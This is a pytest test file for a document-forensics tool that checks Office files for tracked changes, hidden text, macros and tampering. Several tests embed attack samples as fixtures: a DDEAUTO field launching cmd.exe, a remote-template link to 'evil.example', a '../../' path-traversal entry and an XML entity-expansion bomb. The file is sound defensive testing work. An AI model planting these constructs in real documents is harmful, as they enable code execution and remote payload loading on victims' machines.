import os

import pytest

import officegen as og
import pdfgen
from conftest import finding, ids
from pdfforensics import document
from pdfforensics.cli import main

TRACKED = og.word_body(
    '<w:p><w:r><w:t>Invoice total: </w:t></w:r>'
    '<w:del w:id="1" w:author="Mallory"><w:r><w:delText>100 SEK</w:delText></w:r></w:del>'
    '<w:ins w:id="2" w:author="Mallory"><w:r><w:t>900 SEK</w:t></w:r></w:ins></w:p>')


def test_clean_docx(analyze):
    r = analyze(og.build("docx"), "letter.docx")
    assert r["file"]["format"] == "ooxml" and r["file"]["kind"] == "docx"
    assert r["verdict"]["label"] == "no-indicators", [f["id"] for f in r["findings"]]
    assert r["verdict"]["complete"]
    s = r["summary"]
    assert s["document"].startswith("DOCX document produced by Microsoft Office Word 16.0000")
    assert "No pending tracked changes (no deleted text left in the file)." in s["ruled_out"]
    assert r["facts"]["fingerprint"]["pipeline_hash"]


def test_tracked_changes_expose_deleted_text(analyze):
    r = analyze(og.build("docx", main=TRACKED), "inv.docx")
    f = finding(r, "office.tracked-changes")
    assert f["severity"] == "medium"
    assert any("100 SEK" in t for t in f["evidence"]["deleted_text"])
    assert f["evidence"]["authors"] == ["Mallory"]
    k = r["summary"]["key_findings"][0]
    assert '"100 SEK"' in k["evidence"] and '"900 SEK"' in k["evidence"] and "Mallory" in k["evidence"]
    assert any("All Markup" in a for a in r["summary"]["recommended_actions"])
    assert r["summary"]["recommended_actions"][-1].startswith("To settle the question, use a stronger source")


def test_hidden_word_text(analyze):
    body = og.word_body('<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>secret IBAN</w:t></w:r></w:p>')
    f = finding(analyze(og.build("docx", main=body), "a.docx"), "office.hidden-text")
    assert "secret IBAN" in f["evidence"]["text"][0]


def test_dde_field(analyze):
    body = og.word_body('<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText>'
                        '</w:r></w:p>')
    assert finding(analyze(og.build("docx", main=body), "a.docx"), "office.dde-field")["severity"] == "high"


def test_macros_in_macro_free_extension(analyze):
    r = analyze(og.build("docx", extra={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0fake"}), "invoice.docx")
    f = finding(r, "office.macros")
    assert f["severity"] == "high" and "in a .docx file" in f["title"]
    r2 = analyze(og.build("docx", extra={"word/vbaProject.bin": b"x"}), "tool.docm")
    assert "in a" not in finding(r2, "office.macros")["title"]


def test_remote_template_injection(analyze):
    extra = og.external_rels("word/_rels/settings.xml.rels", "attachedTemplate", "https://evil.example/t.dotm")
    r = analyze(og.build("docx", extra=extra), "a.docx")
    assert finding(r, "office.remote-template")["severity"] == "high"
    assert "evil.example" in r["summary"]["key_findings"][0]["evidence"]


def test_modified_before_created_and_future(analyze):
    core = og.core_xml(created="2026-05-01T10:00:00Z", modified="2026-04-01T10:00:00Z")
    r = analyze(og.build("docx", core=core), "a.docx")
    assert finding(r, "office.modified-before-created")["confidence"] == "high"
    core = og.core_xml(created="2031-01-01T10:00:00Z", modified="2031-01-01T11:00:00Z")
    assert "office.future-date" in ids(analyze(og.build("docx", core=core), "b.docx"))


def test_very_hidden_sheet(analyze):
    wb = og.workbook((("Invoice", "visible"), ("Calc", "hidden"), ("Real", "veryHidden")))
    r = analyze(og.build("xlsx", main=wb, app=og.app_xml(app="Microsoft Excel")), "book.xlsx")
    assert finding(r, "office.very-hidden-sheets")["evidence"]["sheets"] == ["Real"]
    assert finding(r, "office.hidden-sheets")["evidence"]["sheets"] == ["Calc"]


def test_hidden_slide(analyze):
    extra = {"ppt/slides/slide1.xml": og.slide(), "ppt/slides/slide2.xml": og.slide(hidden=True)}
    r = analyze(og.build("pptx", extra=extra, app=og.app_xml(app="Microsoft Office PowerPoint")), "deck.pptx")
    assert finding(r, "office.hidden-slides")["evidence"]["slides"] == ["slide2.xml"]


def test_duplicate_and_traversal_parts(analyze):
    data = og.build("docx", duplicate="word/document.xml", extra={"../../evil.txt": "x"})
    r = analyze(data, "a.docx")
    assert {"office.duplicate-parts", "office.unsafe-paths"} <= ids(r)


def test_opc_nonconformant(analyze):
    r = analyze(og.build("docx", content_types=False), "a.docx")
    assert "office.opc-nonconformant" in ids(r)


def test_entity_expansion_is_refused(analyze):
    bomb = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]>'
            '<cp:coreProperties xmlns:cp="x">&lol2;</cp:coreProperties>')
    r = analyze(og.build("docx", core=bomb), "a.docx")
    assert "office.parts-not-parsed" in ids(r)
    assert r["verdict"]["complete"]


def test_extension_mismatches(analyze):
    r = analyze(og.build("docx"), "report.xlsx")
    assert finding(r, "office.extension-mismatch")["evidence"]["detected"] == "docx"
    r = analyze(pdfgen.build(), "invoice.docx")
    assert finding(r, "input.extension-mismatch")["evidence"]["detected"] == "pdf"
    assert r["file"]["format"] == "pdf"


def test_zip_named_docx_without_office_parts_is_incomplete(analyze):
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("readme.txt", "hello")
    r = analyze(buf.getvalue(), "fake.docx")
    assert "office.not-an-office-package" in ids(r)
    assert not r["verdict"]["complete"]


def test_plain_zip_is_rejected(tmp_path):
    import zipfile
    p = tmp_path / "archive.zip"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("a.txt", "x")
    with pytest.raises(document.InputError, match="not an Office document"):
        from pdfforensics.engine import analyze_file
        analyze_file(p)


def test_legacy_ole_is_reported_incomplete(analyze):
    r = analyze(bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 600, "old.doc")
    assert "office.legacy-format" in ids(r)
    assert not r["verdict"]["complete"]


def test_zero_edit_time_many_revisions(analyze):
    r = analyze(og.build("docx", app=og.app_xml(total_time="0"), core=og.core_xml(revision="7")), "a.docx")
    f = finding(r, "office.zero-edit-time")
    assert f["confidence"] == "low"


def test_cli_analyses_office_in_batch(tmp_path, capsys):
    src = tmp_path / "case"
    src.mkdir()
    (src / "a.docx").write_bytes(og.build("docx", main=TRACKED))
    (src / "b.xlsx").write_bytes(og.build("xlsx"))
    (src / "c.pdf").write_bytes(pdfgen.build())
    (src / "notes.txt").write_text("ignored")
    out = tmp_path / "out"
    assert main(["analyze", str(src), "--out-dir", str(out)]) == 0
    assert len(list(out.glob("*.forensics.json"))) == 3
    md = next(out.glob("a.docx.*.forensics.md")).read_text()
    assert md.startswith("# Document forensic report: a.docx") and "Author / last saved by" in md


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="no symlinks")
def test_symlink_is_rejected(tmp_path):
    real = tmp_path / "real.pdf"
    real.write_bytes(pdfgen.build())
    link = tmp_path / "link.pdf"
    try:
        link.symlink_to(real)
    except OSError:
        pytest.skip("symlinks not permitted")
    with pytest.raises(document.InputError, match="symbolic links"):
        document.load(link)
    assert main(["analyze", str(link)]) == 2


def test_same_name_in_subfolders_does_not_overwrite(tmp_path, capsys):
    for d, prod in (("x", "Acme"), ("y", "Other")):
        (tmp_path / "in" / d).mkdir(parents=True)
        (tmp_path / "in" / d / "invoice.pdf").write_bytes(pdfgen.build(producer=prod))
    out = tmp_path / "out"
    assert main(["analyze", str(tmp_path / "in"), "-r", "--out-dir", str(out)]) == 0
    assert len(list(out.glob("invoice.pdf.*.forensics.json"))) == 2
